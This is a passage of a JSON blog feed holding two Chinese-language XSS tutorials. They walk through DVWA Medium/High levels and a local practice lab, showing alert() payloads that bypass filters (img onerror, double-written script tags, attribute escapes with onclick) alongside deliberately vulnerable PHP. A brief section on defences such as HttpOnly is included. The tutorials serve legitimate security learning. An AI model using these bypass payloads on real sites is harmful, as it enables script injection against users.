            "content_html": "<h1 id=\"xss绕过进阶\"><a class=\"markdownIt-Anchor\" href=\"#xss绕过进阶\">#</a> XSS 绕过进阶</h1>\n<p>讲述 XSS 绕过。</p>\n<h1 id=\"dvwa-medium\"><a class=\"markdownIt-Anchor\" href=\"#dvwa-medium\">#</a> DVWA-Medium</h1>\n<p>本章节使用 <code>DVWA-Medium</code>  安全难度</p>\n<h2 id=\"xss-dom\"><a class=\"markdownIt-Anchor\" href=\"#xss-dom\">#</a> XSS DOM</h2>\n<p>首先， <code>GET</code>  请求， <code>default</code>  可控，我们不妨尝试：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019005840851.png\" alt=\"image-20221019005840851\"></p>\n<p>没有弹框， <code>URL</code>  被自动换回 <code>default=English</code></p>\n<p>尝试 <code>img</code>  标签</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=<span class=\"tag\">&lt;<span class=\"name\">img</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019010005305.png\" alt=\"image-20221019010005305\"></p>\n<p><code>img</code>  标签没有被替换回去，能用</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_d/?default=<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">1</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert()</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>但没有弹框</p>\n<p><img src=\"image-20221019010103425.png\" alt=\"image-20221019010103425\"></p>\n<p>我们只好查看源码：</p>\n<p><img src=\"image-20221019010223667.png\" alt=\"image-20221019010223667\"></p>\n<p>发现这里已经变成了 <code>option value</code>  的值，也就是字符串，所以我们需要令其逃逸出来。</p>\n<p>逃逸需要考虑两点：</p>\n<ul>\n<li>需要在执行完增加 <code>German</code>  选项后执行【原因是如果在中间插入 <code>img</code>  标签会导致无用】</li>\n<li><code>img</code>  标签需要放在 <code>option</code>  和 <code>select</code>  标签外面，否则会不起作用</li>\n</ul>\n<p>我们需要使用 Chrome 进行单步调试到这一步</p>\n<p><img src=\"image-20221019012834888.png\" alt=\"image-20221019012834888\"></p>\n<p>然后在控制台 Console 中输入</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">var lang = &quot;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert()&gt;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">document.write(lang);</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019012721926.png\" alt=\"image-20221019012721926\"></p>\n<p>点击运行</p>\n<p><img src=\"image-20221019012913112.png\" alt=\"image-20221019012913112\"></p>\n<p>成功弹框</p>\n<p><img src=\"image-20221019012927916.png\" alt=\"image-20221019012927916\"></p>\n<h2 id=\"xss-reflected\"><a class=\"markdownIt-Anchor\" href=\"#xss-reflected\">#</a> XSS Reflected</h2>\n<p>输入 111，回显</p>\n<p><img src=\"image-20221019013402813.png\" alt=\"image-20221019013402813\"></p>\n<p>尝试 XSS</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019013617281.png\" alt=\"image-20221019013617281\"></p>\n<p>发现前面的 <code>&lt;script&gt;</code>  整个被吃掉</p>\n<p>尝试双写</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=<span class=\"tag\">&lt;<span class=\"name\">scscriptript</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019013710716.png\" alt=\"image-20221019013710716\"></p>\n<p>没有被吃掉，我们猜想是不是连同尖括号一起吃呢？</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;sc<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>ript&gt;alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019013816392.png\" alt=\"image-20221019013816392\"></p>\n<p>当然，这个题还可以使用 <code>img</code>  标签</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=1<span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">1</span> <span class=\"attr\">onerror</span>=<span class=\"string\">alert()</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019013931387.png\" alt=\"image-20221019013931387\"></p>\n<h2 id=\"xss-stored\"><a class=\"markdownIt-Anchor\" href=\"#xss-stored\">#</a> XSS Stored</h2>\n<p>我们尝试输入</p>\n<p><img src=\"image-20221019014211349.png\" alt=\"image-20221019014211349\"></p>\n<p>查看源码</p>\n<p><img src=\"image-20221019014121390.png\" alt=\"image-20221019014121390\"></p>\n<p>发现， <code>Name</code>  中 <code>img</code>  标签没有过滤，那么我们就可以构造</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onerror=alert()&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"Fimage-20221019014431922.png\" alt=\"image-20221019014431922\"></p>\n<p><img src=\"image-20221019014458321.png\" alt=\"image-20221019014458321\"></p>\n<p>成功弹框</p>\n<p><img src=\"image-20221019015353575.png\" alt=\"image-20221019015353575\"></p>\n<h1 id=\"dvwa-high\"><a class=\"markdownIt-Anchor\" href=\"#dvwa-high\">#</a> DVWA-High</h1>\n<p>开启 <code>High</code>  难度</p>\n<p><img src=\"image-20221019221540107.png\" alt=\"image-20221019221540107\"></p>\n<h2 id=\"xss-dom-2\"><a class=\"markdownIt-Anchor\" href=\"#xss-dom-2\">#</a> XSS DOM</h2>\n<p>依旧是调试源码。</p>\n<p>等到运行到 <code>German</code>  时，敲入：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">var lang = &quot;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert()&gt;&quot;;</span><br><span class=\"line\">document.write(lang);</span><br></pre></td></tr></table></figure>\n<p>就可以令 <code>img</code>  标签语句插入到这里</p>\n<p><img src=\"image-20221019222240264.png\" alt=\"image-20221019222240264\"></p>\n<p>放行运行，成功弹窗</p>\n<p><img src=\"image-20221019222216830.png\" alt=\"image-20221019222216830\"></p>\n<h2 id=\"xss-reflected-2\"><a class=\"markdownIt-Anchor\" href=\"#xss-reflected-2\">#</a> XSS Reflected</h2>\n<p><code>script</code>  标签用不了，尝试使用 <code>img</code>  标签</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/DVWA/vulnerabilities/xss_r/?name=&lt;img src=1 onerror=alert()&gt;</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221019222606613.png\" alt=\"image-20221019222606613\"></p>\n<h2 id=\"xss-stored-2\"><a class=\"markdownIt-Anchor\" href=\"#xss-stored-2\">#</a> XSS Stored</h2>\n<p>修改 Name 的最大输入长度为 <code>100</code></p>\n<p><img src=\"image-20221019222817488.png\" alt=\"image-20221019222817488\"></p>\n<p>输入：</p>\n<p><img src=\"image-20221019222722193.png\" alt=\"image-20221019222722193\"></p>\n<p>即可弹窗</p>\n<p><img src=\"image-20221019222901876.png\" alt=\"image-20221019222901876\"></p>\n<h1 id=\"xss-防御\"><a class=\"markdownIt-Anchor\" href=\"#xss-防御\">#</a> XSS 防御</h1>\n<h2 id=\"客户端打补丁-升级-noscript等扩展功能\"><a class=\"markdownIt-Anchor\" href=\"#客户端打补丁-升级-noscript等扩展功能\">#</a> 客户端打补丁、升级、NoScript 等扩展功能</h2>\n<p><img src=\"image-20221019223723238.png\" alt=\"image-20221019223723238\"></p>\n<h2 id=\"httponly\"><a class=\"markdownIt-Anchor\" href=\"#httponly\">#</a> HttpOnly</h2>\n<p><img src=\"image-20221019223527721.png\" alt=\"image-20221019223527721\"></p>\n<p><img src=\"image-20221019223543384.png\" alt=\"image-20221019223543384\"></p>\n<h2 id=\"输入输出检查\"><a class=\"markdownIt-Anchor\" href=\"#输入输出检查\">#</a> 输入 / 输出检查</h2>\n<p><img src=\"image-20221019223618348.png\" alt=\"image-20221019223618348\"></p>\n<p><img src=\"image-20221019223632692.png\" alt=\"image-20221019223632692\"></p>\n<p><img src=\"image-20221019223649325.png\" alt=\"image-20221019223649325\"></p>\n",
            "tags": [
                "XSS跨站脚本攻击探究"
            ]
        },
        {
            "id": "https://kiyomijin.github.io/2022/10/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%BB%95%E8%BF%87/",
            "url": "https://kiyomijin.github.io/2022/10/20/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB%E6%8E%A2%E7%A9%B6/XSS%E5%B0%8F%E5%AE%9E%E8%B7%B5%E4%B8%8E%E7%BB%95%E8%BF%87/",
            "title": "XSS小实践与绕过",
            "date_published": "2022-10-20T15:36:10.000Z",
            "content_html": "<h1 id=\"xss实践尝试\"><a class=\"markdownIt-Anchor\" href=\"#xss实践尝试\">#</a> XSS 实践尝试</h1>\n<p>来到 127.0.0.1/xss_vuln</p>\n<h2 id=\"xss初体验\"><a class=\"markdownIt-Anchor\" href=\"#xss初体验\">#</a> XSS 初体验</h2>\n<p><img src=\"image-20221018203227623.png\" alt=\"image-20221018203227623\"></p>\n<p>是 get 请求，那么我们看一下参数 test 是否可控</p>\n<p><img src=\"image-20221018203244376.png\" alt=\"image-20221018203244376\"></p>\n<p>参数可控，那么我们可以写入</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level1.php?name=<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018203401144.png\" alt=\"image-20221018203401144\"></p>\n<p>查看前台源码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span><span class=\"comment\">&lt;!--STATUS OK--&gt;</span><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;content-type&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">window</span>.<span class=\"property\">alert</span> = <span class=\"keyword\">function</span>(<span class=\"params\"></span>)  </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;     </span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"title function_\">confirm</span>(<span class=\"string\">&quot;完成的不错！&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"> <span class=\"variable language_\">window</span>.<span class=\"property\">location</span>.<span class=\"property\">href</span>=<span class=\"string\">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>欢迎来到level1<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>欢迎来到level1<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>欢迎用户JACK<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">level1.png</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h3</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>payload的长度:4<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>使用 window.alert 来重写我们的 alert 函数，无论我们在 alert () 中加入什么参数，都会显示 “完成的不错！”</p>\n<p>这里我们目前看不到 get 请求的处理。</p>\n<p>那么继续来看后台代码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span><span class=\"comment\">&lt;!--STATUS OK--&gt;</span><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;content-type&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">window</span>.<span class=\"property\">alert</span> = <span class=\"keyword\">function</span>(<span class=\"params\"></span>)  </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;     </span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"title function_\">confirm</span>(<span class=\"string\">&quot;完成的不错！&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"> <span class=\"variable language_\">window</span>.<span class=\"property\">location</span>.<span class=\"property\">href</span>=<span class=\"string\">&quot;level2.php?keyword=test&quot;</span>; </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>欢迎来到level1<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>欢迎来到level1<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php </span></span><br><span class=\"line\"><span class=\"meta\">ini_set(&quot;display_errors&quot;, 0);</span></span><br><span class=\"line\"><span class=\"meta\">$str = $_GET[&quot;name&quot;];</span></span><br><span class=\"line\"><span class=\"meta\">echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;; &lt;--XSS漏洞点，对于GET的参数没做校验</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">level1.png</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php </span></span><br><span class=\"line\"><span class=\"meta\">echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>可以看到，由于用户 <code>JACK</code>  处没有做任何的校验，直接用 <code>.</code>  来做拼接，那么我们在此处写入 XSS 代码，就会执行脚本语言。</p>\n<h2 id=\"xss绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss绕过\">#</a> XSS 绕过</h2>\n<p>来到第二关</p>\n<p><img src=\"image-20221018204436214.png\" alt=\"image-20221018204436214\"></p>\n<p>查看前台源码：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span><span class=\"comment\">&lt;!--STATUS OK--&gt;</span><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;content-type&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;text/html;charset=utf-8&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"variable language_\">window</span>.<span class=\"property\">alert</span> = <span class=\"keyword\">function</span>(<span class=\"params\"></span>)  </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#123;     </span></span><br><span class=\"line\"><span class=\"language-javascript\"><span class=\"title function_\">confirm</span>(<span class=\"string\">&quot;完成的不错！&quot;</span>);</span></span><br><span class=\"line\"><span class=\"language-javascript\"> <span class=\"variable language_\">window</span>.<span class=\"property\">location</span>.<span class=\"property\">href</span>=<span class=\"string\">&quot;level3.php?writing=wait&quot;</span>; </span></span><br><span class=\"line\"><span class=\"language-javascript\">&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\"></span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>欢迎来到level2<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h1</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>欢迎来到level2<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h2</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>没有找到和JACK相关的结果.<span class=\"tag\">&lt;/<span class=\"name\">h2</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">action</span>=<span class=\"string\">level2.php</span> <span class=\"attr\">method</span>=<span class=\"string\">GET</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">name</span>=<span class=\"string\">keyword</span>  <span class=\"attr\">value</span>=<span class=\"string\">&quot;JACK&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">submit</span> <span class=\"attr\">name</span>=<span class=\"string\">submit</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;搜索&quot;</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">center</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">img</span> <span class=\"attr\">src</span>=<span class=\"string\">level2.png</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">center</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">h3</span> <span class=\"attr\">align</span>=<span class=\"string\">center</span>&gt;</span>payload的长度:4<span class=\"tag\">&lt;/<span class=\"name\">h3</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>此处和第一关的不同在于使用了 form 表单请求，当点击搜索的时候会发送 GET 请求。</p>\n<p>那么我们尝试输入 XSS</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level2.php?keyword=<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>&amp;submit=JACK</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018204740946.png\" alt=\"image-20221018204740946\"></p>\n<p>发现 <code>尖括号</code> 被转码，但是在下方 <code>input</code>  输入标签内，出现了 XSS 标准语句，那么我们需要让 <code>尖括号&lt;&gt;逃逸</code></p>\n<p>注意： <code>&lt;input&gt;</code>  框需要闭合</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level2.php?keyword=&quot;&gt;<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span>alert()<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span>&amp;submit=JACK</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018205525037.png\" alt=\"image-20221018205525037\"></p>\n<p>查看其后台源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;keyword&quot;</span>];</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class=\"title function_ invoke__\">htmlspecialchars</span>(<span class=\"variable\">$str</span>).<span class=\"string\">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class=\"string\">&#x27;&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form action=level2.php method=GET&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class=\"variable\">$str</span>.<span class=\"string\">&#x27;&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/center&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>关键在于使用了 htmlspecialchars 函数做了转义。</p>\n<p>htmlspecialchars () 函数把预定义的字符转换为 HTML 实体。</p>\n<p>预定义的字符是：</p>\n<ul>\n<li><code>&amp;</code>  （和号）成为  <code>&amp;amp</code></li>\n<li><code>&quot;</code>  （双引号）成为  <code>&amp;quot</code></li>\n<li><code>'</code>  （单引号）成为  <code>'</code>   , 原样输出</li>\n<li><code>&lt;</code>  （小于）成为  <code>&amp;lt</code></li>\n<li><code>&gt;</code>  （大于）成为  <code>&amp;gt</code></li>\n</ul>\n<h2 id=\"xss事件绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss事件绕过\">#</a> XSS 事件绕过</h2>\n<p>照前面的思路，这一题直接尝试在输入框写入 XSS 代码</p>\n<p><img src=\"image-20221018210913300.png\" alt=\"image-20221018210913300\"></p>\n<p>查看前台源码，看看过滤成了什么样子：</p>\n<p><img src=\"image-20221018210855840.png\" alt=\"image-20221018210855840\"></p>\n<p>我们发现在 value 中的部分也做了过滤，那我们需要在逃逸单引号的同时，让 alert () 函数也执行。</p>\n<p>HTML 的事件函数，可以返回 script 值。也就是说，当你写入事件的参数时，事件触发后自动变成 script 标签：</p>\n<p><img src=\"image-20221018211546936.png\" alt=\"image-20221018211546936\"></p>\n<p>使用 onclick 事件函数触发 alert ()</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">http://127.0.0.1/xss_vuln/level3.php?keyword=&#x27; onclick=&#x27;alert()&#x27; &#x27;&amp;submit=æç´¢</span><br></pre></td></tr></table></figure>\n<p>提交 URL 后，随便点击一下触发 onclick 事件，成功绕过：</p>\n<p><img src=\"image-20221018212039821.png\" alt=\"image-20221018212039821\"></p>\n<h2 id=\"xss语法绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss语法绕过\">#</a> XSS 语法绕过</h2>\n<p>第四关，我们直接看一下源码：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"title function_ invoke__\">ini_set</span>(<span class=\"string\">&quot;display_errors&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$str</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&quot;keyword&quot;</span>];</span><br><span class=\"line\"><span class=\"variable\">$str2</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;&gt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$str</span>);</span><br><span class=\"line\"><span class=\"variable\">$str3</span>=<span class=\"title function_ invoke__\">str_replace</span>(<span class=\"string\">&quot;&lt;&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"variable\">$str2</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class=\"title function_ invoke__\">htmlspecialchars</span>(<span class=\"variable\">$str</span>).<span class=\"string\">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class=\"string\">&#x27;&lt;center&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;form action=level4.php method=GET&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class=\"variable\">$str3</span>.<span class=\"string\">&#x27;&quot;&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/form&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;/center&gt;&#x27;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>发现是使用 str_replace 来把 <code>&gt;</code>  和 <code>&lt;</code>  都替换成了空值，所以这种情况下，依旧使用 onclick 事件来 XSS 是可以的。</p>\n<p>观察前台源码是使用 <code>双引号</code> 闭合的，那么输入：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">“ onclick=&#x27;alert()&#x27; ”</span><br></pre></td></tr></table></figure>\n<p><img src=\"image-20221018212821722.png\" alt=\"image-20221018212821722\"></p>\n<h2 id=\"xss黑名单绕过\"><a class=\"markdownIt-Anchor\" href=\"#xss黑名单绕过\">#</a> XSS 黑名单绕过</h2>\n<p>第五关，我们照常理使用标准 XSS 脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;alert()&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n<p>查看源代码看看变成了啥：</p>\n<p><img src=\"image-20221018213520325.png\" alt=\"image-20221018213520325\"></p>\n<p><code>script</code>  被替换成了 <code>scri_pt</code></p>\n<p>那我们使用事件绕过：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&quot; 